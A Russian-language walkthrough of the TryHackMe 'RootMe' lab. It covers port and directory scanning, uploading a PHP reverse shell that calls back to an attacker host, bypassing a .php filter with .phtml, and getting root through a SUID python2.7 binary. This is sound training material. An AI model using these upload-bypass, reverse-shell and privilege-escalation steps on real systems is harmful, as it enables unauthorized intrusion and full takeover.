<div align="center">

# RootMe

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/rrootme)[![Category](https://img.shields.io/badge/Web-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/rrootme)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/rrootme)

</div> <br/>

## `./recon`

Проведено сканирование портов через nmap:

```bash
nmap -sS <ip> -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Обнаружены открытые порты 22 (ssh) и 80 (http), определены версии сервисов

<br/>

## `./enum`

Запущен gobuster для поиска директорий и файлов

```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x http,php,txt

/panel                (Status: 301) [Size: 316] [--> http://<ip>/panel/]
/index.php            (Status: 200) [Size: 616]
/uploads              (Status: 301) [Size: 318] [--> http://<ip>/uploads/]
```

Найдены скрытые директории `/panel` и `/uploads`

Проверены через curl:
- На главной странице — ничего интересного
- В `/uploads` — уже сохранённые файлы
- В `/panel` — форма загрузки файла на сервер

Возможность загрузки произвольного файла — <font color="#ff0000">потенциальная уязвимость</font>

<br/>

## `./exploit`

Открыта прослушка на 1234 порту

```bash
nc -lvp 1234
```

Подготовлен reverse-shell на основе готового php-шелла

```bash
cp /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php shell.php
```

В файле изменены IP и порт под свои значения

```php
$ip = '<attacker_ip>';  // CHANGE THIS
$port = 1234;           // CHANGE THIS
```

Отправлена попытка загрузки на сайт

```bash
curl -F 'fileUpload=@shell.php' -F 'submit=Upload' http://<ip>/panel/

PHP não é permitido!
```

Расширение `.php` фильтруется. Использован обходной вариант — `.phtml`

```bash
cat shell.php > shell.phtml
curl -F 'fileUpload=@shell.phtml' -F 'submit=Upload' http://<ip>/panel/

O arquivo foi upado com sucesso!
```

Файл успешно загружен
Прослушка запущена, шелл вызван через curl

```bash
curl http://<ip>/uploads/shell.phtml
```

На стороне слушателя получено соединение

```
Connection received on ip-<ip> 51546
Linux ip-<ip> 5.15.0-139-generic #149~20.04.1-Ubuntu SMP x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Получен доступ к системе от имени `www-data`

<br/>

## `./environment`

Терминал урезанный. Проверено наличие python для апгрейда шелла

```bash
python3 --version

Python 3.8.10
```

Шелл улучшен до полноценного bash

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Найден и прочитан первый флаг

```bash
find / -name user.txt 2>/dev/null

/var/www/user.txt
```

Флаг user.txt получен!

<br/>

## `./privesc`

Выполнен поиск SUID-файлов, принадлежащих root

```bash
find / -user root -perm -4000 2>/dev/null

/usr/bin/python2.7
```

Обнаружен уязвимый бинарник — `python2.7` с установленным SUID-битом. Использован для получения root-шелла

```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Найден и прочитан второй флаг

```bash
find / -name root.txt 2>/dev/null

/root/root.txt
```

Флаг root.txt получен!